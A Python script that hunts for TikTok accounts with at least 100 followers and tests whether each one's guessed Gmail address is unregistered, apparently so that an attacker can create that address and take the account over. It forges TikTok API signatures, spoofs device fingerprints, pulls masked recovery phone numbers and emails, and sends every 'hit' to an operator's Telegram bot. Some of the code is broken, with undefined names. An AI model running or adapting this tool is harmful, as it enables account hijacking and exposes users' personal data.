import os
try:
    import requests
    import uuid
    import time
    import secrets
    import binascii
    from user_agent import generate_user_agent as nn
    import random,re
    from MedoSigner import Argus, Gorgon, md5, Ladon
    from urllib.parse import urlencode
    from types import coroutine
    import threading
    from concurrent.futures import ThreadPoolExecutor
except:
    os.system("pip install requests")
    os.system("pip install uuid")
    os.system("pip install user_agent")
    os.system("pip install MedoSigner")
    os.system("pip install pycryptodome")
    os.system("pip install types")
os.system("clear")
#-------------[]-------------        
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
#-------------[]------------
class S1:
  def __init__(self):
    self.t=0
    self.f=0
    self.tf=0
    self.a = 'qwertyuiopasdfghjklzxcvbnm'
    self.tok=input(f"{HH} Token: {M}")
    self.id=input(f"{HH} ID: {M}")
    self.ses=input(f"{HH} ses tik: {M}")
    os.system("clear")
    for _ in range(10):
      threading.Thread(target=self.se).start()
  def re(self,email):
      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
          }

      try:
          secret = secrets.token_hex(16)
          session = requests.Session()
          session.cookies.update({"passport_csrf_token": secret, "passport_csrf_token_default": secret})

          url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
          params = {
              'request_tag_from': "h5",
              'fixed_mix_mode': "1",
              'mix_mode': "1",
              'account_param': user,
              'scene': "5",
              'device_platform': "android",
              'os': "android",
              'ssmix': "a",
              '_rticket': str(round(time.time() * 1000)),
              'cdid': str(uuid.uuid4()),
              'channel': "googleplay",
              'aid': "1233",
              'app_name': "musical_ly",
              'version_code': "370104",
              'version_name': "37.1.4",
              'manifest_version_code': "2023701040",
              'update_version_code': "2023701040",
              'ab_version': "37.1.4",
              'resolution': "720*1448",
              'dpi': "320",
              'device_type': "RMX3269",
              'device_brand': "realme",
              'language': "ar",
              'os_api': "30",
              'os_version': "11",
              'ac': "wifi",
              'is_pad': "0",
              'current_region': "IQ",
              'app_type': "normal",
              'sys_region': "IQ",
              'last_install_time': str(int(time.time())),
              'mcc_mnc': "41840",
              'timezone_name': "Asia/Baghdad",
              'carrier_region_v2': "418",
              'residence': "IQ",
              'app_language': "ar",
              'carrier_region': "IQ",
              'timezone_offset': "10800",
              'host_abi': "arm64-v8a",
              'locale': "ar",
              'ac2': "wifi",
              'uoo': "0",
              'op_region': "IQ",
              'build_number': "37.1.4",
              'region': "IQ",
              'ts': str(int(time.time())),
              'iid': str(random.randint(1, 10**19)),
              'device_id': str(random.randint(1, 10**19)),
              'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
              'support_webview': "1",
              'cronet_version': "f6248591_2024-09-11",
              'ttnet_version': "4.2.195.9-tiktok",
              'use_store_region_cookie': "1"
          }

          x_args = sign(params=urlencode(params), payload="", cookie="")
          headers = {
              'User-Agent': "com.zhiliaoapp.musically/2023701040 (Linux; U; Android 11; ar_IQ; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:f6248591 2024-09-11 QuicVersion:182d68c8 2024-05-28)",
              'Accept': "application/json, text/plain, */*",
              'x-tt-passport-csrf-token': secret,
              'content-type': "application/x-www-form-urlencoded",
              'x-argus': x_args["x-argus"],
              'x-gorgon': x_args["x-gorgon"],
              'x-khronos': x_args["x-khronos"],
              'x-ladon': x_args["x-ladon"]
          }

          response = session.post(url, params=params, headers=headers)
          response.raise_for_status()

          passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]

          login_url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
          params.update({"passport_ticket": passport_ticket})

          for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
              params.pop(key, None)

          response = session.post(login_url, params=params, headers=headers)
          response.raise_for_status()

          hh = json.loads(response.headers.get("x-tt-verify-idv-decision-conf", "{}"))
          result = {'number': '', 'email': ''}

          for entry in hh.get('extra', []):
              if '+' in entry['masked_account']:
                  result['number'] = entry['masked_account']
              elif '@' in entry['masked_account']:
                  result['email'] = entry['masked_account']

          return result

      except Exception as e:
          print(f"Error occurred: {e}")
          return {'number': '', 'email': ''}
  def info(self,email):
    user=email.split('@')[0]
    try:
      he={'User-Agent':str(nn())}
      ti= requests.get(f'https://www.tiktok.com/@{user}', headers=he).text
      info = str(ti.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
      country = str(info.split('region":"')[1]).split('",')[0]
      like = str(info.split('heart":')[1]).split(',"')[0]
      name = str(info.split('nickname":"')[1]).split('",')[0]
      followers = str(info.split('followerCount":')[1]).split(',"')[0]
      following = str(info.split('followingCount":')[1]).split(',"')[0]
      video = str(info.split('videoCount":')[1]).split(',"')[0]
      id = str(info.split('id":"')[1]).split('",')[0]
      private = str(info.split('privateAccount":')[1]).split(',"')[0]
      rest=self.re(email)
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
Likes : {like}
Country : {country}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {private}
𝚅𝙴𝙳𝙾 : {video}
═══════════════════
        '''	
      print(ff)        
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
        x.write(ff)
    except:
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
═══════════════════
        '''				
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
              x.write(ff)

  def to(self):
      try:
        a=self.a
        s1 = "".join(random.choice(a) for _ in range(random.randrange(6, 9)))
        s2 = "".join(random.choice(a) for _ in range(random.randrange(6, 9)))
        s3 = "".join(random.choice(a) for _ in range(random.randrange(15, 30)))
        cookies = {
              '__Host-GAPS': s3,
          }

        headers = {
              'authority': 'accounts.google.com',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
              'upgrade-insecure-requests': '1',
              'user-agent': str(nn()),  
          }

        r = requests.get(
              'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
              cookies=cookies,
              headers=headers,
          )

        match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', r.text)
        if not match:
               print('')
               return

        tok = match.group(2)

        headers.update({
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'google-accounts-xsrf': '1',
              'origin': 'https://accounts.google.com',
              'referer': 'https://accounts.google.com/signup/v2/createaccount?continue=https://www.google.com/search&q=dhduud&hl=ar',
          })

        data = {
              'f.req': f'["{tok}","{s1}","{s2}","{s1}","{s2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
              'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
          }


        response = requests.post(
              'https://accounts.google.com/_/signup/validatepersonaldetails',
              cookies=cookies,
              headers=headers,
              data=data,
          )
        try:
              tl = str(response.text).split('",null,"')[1].split('"')[0]

        except IndexError:
              return


        host = response.cookies.get('__Host-GAPS', '')



        try:
              os.remove('tl.txt')

        except FileNotFoundError:
              pass

        with open('tl.txt', 'a') as f:
              f.write(tl + '//' + host + '\n')

      except Exception as e:
          pass

  def ch1(self,email):
    self.to()       

    try:
          o = open('tl.txt', 'r').read().splitlines()[0]
          tl, host = o.split('//')
          cookies = {
            '__Host-GAPS': host,
        }
          headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Ddhduud%26oq%3Ddhduud%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzU2OWowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8&hl=ar&parent_directed=true&ddm=1&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': str(nn()),  
        }        
          params = {
            'TL': tl,
        }        



          if '@' in email:
            em=email.split('@')[0]        

          data = f'continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Ddhduud%26oq%3Ddhduud%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzU2OWowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8&ddm=1&flowEntry=SignUp&hl=ar&f.req=%5B%22TL%3A{tl}%22%2C%22{em}%22%2C0%2C0%2C1%2Cnull%2C0%2C4244%5D&at=AFoagUVsrVfPNg-a8rn4W680UeR-MWyEuA%3A1736097014549&azt=AFoagUUrcmcr8XBhg_vKXr4N_weEu2kZlg%3A1736097014549&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A639&checkedDomains=youtube&pstMsg=1&'

          r= requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        ).text


          if '"gf.uar",1' in r:
              self.info(email)
              self.t+=1
              os.system('cls'if os.name=='nt'else'clear')
              lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
              print(lo)		  

          elif '"er",null,null,null,null,400' in r:
              self.ch1(email)
              self.tf+=1
              os.system('cls'if os.name=='nt'else'clear')
              lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
              print(lo)		         			         	

          else:
              self.tf+=1
              os.system('cls'if os.name=='nt'else'clear')
              lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
              print(lo)		         	

    except:
          self.tf+=1		 
          os.system('cls'if os.name=='nt'else'clear')
          lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
          print(lo)    					        



  def ch2(self,email):



      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          data = payload
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(
                  params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id,
                  sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version
              )
          }


      encrypted = [hex(ord(c) ^ 5)[2:] for c in email]
      em = "".join(encrypted)

      session = requests.Session()
    

      secret = secrets.token_hex(16)
      cookies = {
          "passport_csrf_token": secret,
          "passport_csrf_token_default": secret,
          "sessionid": self.ses,
      }
      session.cookies.update(cookies)

      device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
      device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
      regions = ["AE", "IQ", "US", "FR", "DE"]
      languages = ["ar", "en", "fr", "de"]

      params = {
          'passport-sdk-version': "6031490",
          'device_platform': "android",
          'os': "android",
          'ssmix': "a",
          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
          'cdid': str(uuid.uuid4()),
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "370104",
          'version_name': "37.1.4",
          'manifest_version_code': "2023701040",
          'update_version_code': "2023701040",
          'ab_version': "37.1.4",
          'resolution': "720*1448",
          'dpi': str(random.choice([420, 480, 532])),
          'device_type': random.choice(device_types),
          'device_brand': random.choice(device_brands),
          'language': random.choice(languages),
          'os_api': str(random.randint(28, 34)),
          'os_version': str(random.randint(10, 14)),
          'ac': "wifi",
          'is_pad': "0",
          'current_region': random.choice(regions),
          'app_type': "normal",
          'sys_region': random.choice(regions),
          'last_install_time': str(random.randint(1600000000, 1700000000)),
          'mcc_mnc': "41840",
          'timezone_name': "Asia/Baghdad",
          'carrier_region_v2': "418",
          'residence': random.choice(regions),
          'app_language': random.choice(languages),
          'carrier_region': random.choice(regions),
          'timezone_offset': str(random.randint(0, 14400)),
          'host_abi': "arm64-v8a",
          'locale': random.choice(languages),
          'ac2': "wifi",
          'uoo': "0",
          'op_region': random.choice(regions),
          'build_number': "37.1.4",
          'region': random.choice(regions),
          'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
          'iid': str(random.randint(1, 10**19)),
          'device_id': str(random.randint(1, 10**19)),
          'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
          'support_webview': "1",
          'reg_store_region': random.choice(regions).lower(),
          'user_selected_region': "0",
          'cronet_version': "f6248591_2024-09-11",
          'ttnet_version': "4.2.195.9-tiktok",
          'use_store_region_cookie': "1"
      }


      payload = {
        'email': email,
    }

      app_name = "com.zhiliaoapp.musically"
      app_version = f"{random.randint(2000000000, 3000000000)}"
      platform = "Linux"
      os_version = f"Android {random.randint(10, 15)}"
      locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
      locale = random.choice(locales)
      device_type = random.choice(["phone", "tablet", "tv"])
      build = f"UP1A.{random.randint(200000000, 300000000)}"
      cronet_version = f"{random.randint(10000000, 20000000)}"
      cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
      quic_version = f"{random.randint(10000000, 20000000)}"
      quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"

      user_agent = (f"{app_name}/{app_version} ({platform}; U; {os_version}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")


      x_args = sign(params=urlencode(params), payload="", cookie="")

      headers = {
          'User-Agent': user_agent,
          'x-tt-passport-csrf-token': secret,
          'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
          'x-argus': x_args["x-argus"],
          'x-gorgon': x_args["x-gorgon"],
          'x-khronos': x_args["x-khronos"],
          'x-ladon': x_args["x-ladon"],
      }

      url ="https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
      rei = session.post(url, params=params, data=payload, headers=headers).text
      print(rei)
      if '1023' in rei:

        self.ch1(email)
        os.system('cls'if os.name=='nt'else'clear')
        lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
        print(lo)
      else:
        self.f+=1
        os.system('cls'if os.name=='nt'else'clear')
        lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
        print(lo)	    	




  def se(self):
      while True:
          try:

              k= random.choice(
      [
              'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',  
              '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
              'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
              'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
              'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
              'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
              'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
              'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
      ]
  )
              j = ''.join(random.choice(k) for i in range(random.randrange(4, 9)))
              i = "".join(random.choice('1234567890') for i in range(19))
              headers = {"User-Agent": f'com.zhiliaoapp.musically/{j} (Linux; U; Android {random.randrange(7,13)}; en_IQ_#u-nu-letn; ANY-LX1; Build/{j}; Cronet/58.0.{random.randrange(3,9)}.0)'}
              t=requests.get('https://www.tiktok.com/',headers=headers).cookies.get_dict()
              tt=t["ttwid"]


              se=str(uuid.uuid4()).replace('-','')
              cookies = {
      'tt_chain_token': 'JrtxBwKrYDi1P1O2diqOhA==',
      'passport_csrf_token': '246019ac646b14e6d25cf6391b8862a8',
      'passport_csrf_token_default': '246019ac646b14e6d25cf6391b8862a8',
      'msToken': 'PowIaI0fvFjfsxA_0r-kuGWMqB_rm9_4fV1XfzEPnBzCv1cc0l4MRy7wWso6YxnkMD04WDLRmU87SAIlwCcLph5Ix4JZjjnvCgUBSwTbboMX7GAT5sJz2QNyTjw=',
      'd_ticket': 'ebbf13e71e66b5d68782e71a646920750fc22',
      'multi_sids': '7339266198948037633%3A78bd0b37de7c9596b03ee4ff207ac6c9',
      'cmpl_token': 'AgQQAPO_F-RO0rXkoR6EZp04_VbEDeUTP7UsYNv7RQ',
      'sid_guard': '78bd0b37de7c9596b03ee4ff207ac6c9%7C1731681679%7C15552000%7CWed%2C+14-May-2025+14%3A41%3A19+GMT',
      'uid_tt': str(se[:16]),
      'uid_tt_ss': str(se[:16]),
      'sid_tt': str(se),
      'sessionid': str(se),
      'sessionid_ss': str(se),
      'sid_ucp_v1': '1.0.0-KDNiYTY1NjgwYzI2NjRiN2NjZjE3N2M0MzEyZmEzYmIzM2IxMzA0YTEKIgiBiNHikPeT7WUQj7vduQYYswsgDDDun-muBjgBQOoHSAQQAxoGbWFsaXZhIiA3OGJkMGIzN2RlN2M5NTk2YjAzZWU0ZmYyMDdhYzZjOQ',
      'ssid_ucp_v1': '1.0.0-KDNiYTY1NjgwYzI2NjRiN2NjZjE3N2M0MzEyZmEzYmIzM2IxMzA0YTEKIgiBiNHikPeT7WUQj7vduQYYswsgDDDun-muBjgBQOoHSAQQAxoGbWFsaXZhIiA3OGJkMGIzN2RlN2M5NTk2YjAzZWU0ZmYyMDdhYzZjOQ',
      'store-idc': 'alisg',
      'store-country-code': 'sa',
      'store-country-code-src': 'uid',
      'tt-target-idc': 'alisg',
      'tt-target-idc-sign': 'XZmtyx-eMB071s61R-ipkSuBlb1gHWP_2ILLs_mwmzXmgduMteLOhESnOyQN3e7IiPxJUl_HaZVpmHpz7-pdUaYTEgy9GkvVen1WpMtvLsoxtTDlSYtwhKdZH5WfUhKdkfsLC2cMDQQCPuzy2n8ZTAp86XqHlOvuT6HlDnL6Afzog_hIpYAX9JcCmSY5Kdzy23i1xUY8Hm9YfqbCE08MhIcTaqs_2J7uHo6NOUjyjUbSZoHHbra7myQ1jpM8B-QexARXshznh_e20yxUQg5iwcdwbRceU6eIV_upaja9p7k4fCzjAUMDigRL171k6irRP00ZkA7vicBpBT4smdVNFkouNDS-5Nz-KkPFyWWHCu4vQbZgO8ERLE1nB1SIHUrufZsk-LnLCSesrF8G40tF7_nM_ihsbG_bpdVAObLxpisyEy2GV6ZvJAlEQjQeMfb5vtRMwuFwTEXmwuB7JgGpipgj4NcMi2IBVbCFAQRFrZy4jpOkMzQIsmee71O_0jIN',
      'last_login_method': 'email',
      'delay_guest_mode_vid': '5',
      'tiktok_webapp_theme_source': 'system',
      'tiktok_webapp_theme': 'dark',
      'ak_bmsc': '0F9BB0D9E44BABE780D553F1AFD87B00~000000000000000000000000000000~YAAQYHkQAhG+bC+UAQAA0b6LNxoOZPTwXxOyu2eS2/z3pSLTlR93RCpW9VP+Z3KVXu9ffzAr6vfd15ERZxI8q+T/a0/QZXh4ClSyY5m3wwadEzoIhW/CW7cFv602H+qYtOC5r1YQQbUX6odyYpfn/Ra/nQeTzjVHT1D+vx/AiElRyEfsPeabg+nVF+byLj2asmc9tBUHYvq0P4DOrVK/Y/fiyLIyEagVYQvLLCFwa0WMPzFO7xJLPf3iMLoLV0dsun/rUDS/FBhsYJLXPVaKN5FBlCdAnq3SQ8mckI9F95E0KVDwKoF7+QpMTiaqzgLIbriNcqCUZPOI9+cpXHKu3s3U1GDG8FnnwjUGpsaa1coczaarbolmhRmW3OMYMO7hIZigktKbdqgJE7+l/LRmxnC8qavSTti/7y8=',
      'tt_csrf_token': '2A6X0kRJ-Ojgn0FbcobxF1-FATwZUYiHv6KA',
      'passport_fe_beating_status': 'true',
      'ttwid': tt,
      'odin_tt': 'a40d52507c3b11f9f8a4f7a9214cb3af7fe9e891533cfbb6b736bc5811028118edec52ee5634169f2daf866cd8daba57a5fcfa51be083e68fcdafe826a3e843b4476bae9384207847e45cbd50707d18f',
      'bm_sv': '8B9270F6DC4EC8A6561E2DF933584D54~YAAQDNXOF2rQ8gyUAQAAwEWWNxouiDYSa1/A8i5epVtIHabZ5N80lN5oe9ckZn13qLTnIPhyqnsk5hz3OIWKhKhfI48pdu5TsD4CI/KMvIvVkX0nHiAN2VqA8ZmRrQb0VF8hPBBIW0iEgp6whYfEOUYB+ZRukuKlyoxeIZOf8/LEMXvjUvYwN2QR8OtTnSy8L6qYm1gF2cRrhiSmCTHkLmkdoq+Sjw28CvwxQEjdoVuYtaEpgoAkxQapzbiI/4oX~1',
      'msToken':'Hbemm0POD06FpnLCQNu8Xn1YnfgHOYZSbiMRs7gILU43GRmPEcOAsJaNgh6UJEAls49ntILk0DeR0gOsODBFm4T_gTxmTz08M0OzeFCYrIWaoePPgGy2R4Uj00R_2MGgx1IEet8PypAl',
  }
              headers = {
      'authority': 'www.tiktok.com',
      'accept': '*/*',
      'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',

      'referer': 'https://www.tiktok.com/search/user?q=ahmed_faroojsq50&t=1736099390234',

      'user-agent': str(nn()),
              }
              params = {
      'WebIdLastTime': '1731681607',
      'aid': '1988',
      'app_language': 'ar',
      'app_name': 'tiktok_web',
      'browser_language': 'ar-IQ',
      'browser_name': 'Mozilla',
      'browser_online': 'true',
      'browser_platform': 'Linux armv81',
      'browser_version': str(nn()),
      'channel': 'tiktok_web',
      'cookie_enabled': 'true',
      'cursor': '70',
      'data_collection_enabled': 'true',
      'device_id': str(i),
      'device_platform': 'web_pc',
      'focus_state': 'true',
      'from_page': 'search',
      'history_len': '6',
      'is_fullscreen': 'false',
      'is_page_visible': 'true',
      'keyword':str(j),
      'odinId': '7339266198948037633',
      'os': 'linux',
      'priority_region': 'IQ',
      'referer': '',
      'region': 'IQ',
      'screen_height': '800',
      'screen_width': '360',
      'search_id': '202501051749510BD3571B3B38F78E0D00',
      'tz_name': 'Asia/Baghdad',
      'user_is_login': 'true',
      'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
      'webcast_language': 'ar',
      'msToken': 'Hbemm0POD06FpnLCQNu8Xn1YnfgHOYZSbiMRs7gILU43GRmPEcOAsJaNgh6UJEAls49ntILk0DeR0gOsODBFm4T_gTxmTz08M0OzeFCYrIWaoePPgGy2R4Uj00R_2MGgx1IEet8PypAl',
      'X-Bogus': 'DFSzswVL4xhANn49t8VdsFcyeGaP',
      '_signature': '_02B4Z6wo00001HnwuZwAAIDA9VDlFgbGYTh58L0AAHkO5e',
  }
              try:
                  r= requests.get('https://www.tiktok.com/api/search/user/full/', params=params, cookies=cookies, headers=headers).json()
              except:
                  continue
              for q in r['user_list']:

                  fo=(q['user_info']['follower_count'])


                  if fo >= 100:
                    u=(q['user_info']['unique_id'])
                    if '..' in u or '_' in u:
                      continue
                    elif len(u)<5 or len(u)>30:
                      continue
                    else:
                      self.ch2(u+'@gmail.com')






          except:
              pass


S1()
